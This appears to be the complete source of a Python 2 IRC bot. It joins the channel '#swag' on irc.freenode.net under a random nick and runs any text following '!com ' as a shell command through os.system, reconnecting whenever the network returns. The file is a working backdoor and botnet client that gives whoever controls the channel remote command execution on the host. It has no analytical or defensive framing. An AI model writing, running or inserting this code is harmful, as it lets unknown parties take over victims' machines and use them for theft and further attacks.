import socket
import os
import random
import urllib2
import time

def internet_on():
    try:
        response=urllib2.urlopen('http://google.com',timeout=2)
        return True
    except urllib2.URLError as err: pass
    return False

server = "irc.freenode.net"
channel = "#swag"
botnick = ""

for i in range(12):
        botnick += random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789')

while 1:

	if internet_on():
		ircsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		ircsock.connect((server, 6667))
		ircsock.send("NICK "+ botnick +"\n")
		ircsock.send("USER " + botnick + " 8 * :My real name\n")
		ircsock.send("JOIN "+ channel +"\n")

		while 1:

  			ircmsg = ircsock.recv(2048)
  			ircmsg = ircmsg.strip('\n\r')

  			if ircmsg.find(":!com") != -1:
    				head, sep, tail = ircmsg.partition("!com ")
    				os.system(tail)
    
  			if ircmsg.find("PING :") != -1:
    				ircsock.send("PONG :Pong\n")
	else:
		time.sleep(5)
